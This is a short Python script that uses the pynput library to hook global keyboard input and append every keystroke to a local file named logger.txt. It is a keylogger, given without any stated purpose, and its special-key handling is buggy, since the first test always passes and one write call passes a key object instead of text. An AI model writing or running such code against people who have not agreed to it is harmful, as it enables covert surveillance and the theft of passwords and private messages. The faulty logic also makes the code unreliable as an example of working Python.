from pynput import keyboard

def on_press(key):
    with open('logger.txt','a') as file:
        try:
            file.write(key.char)
        except:
            if keyboard.Key.enter:
                file.write("\n")
            elif keyboard.Key.space:
                file.write(" ")
            elif keyboard.Key.tab:
                file.write("\t")
            elif keyboard.Key.backspace:
                # file.write
                pass
            else:
                file.write(key)

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
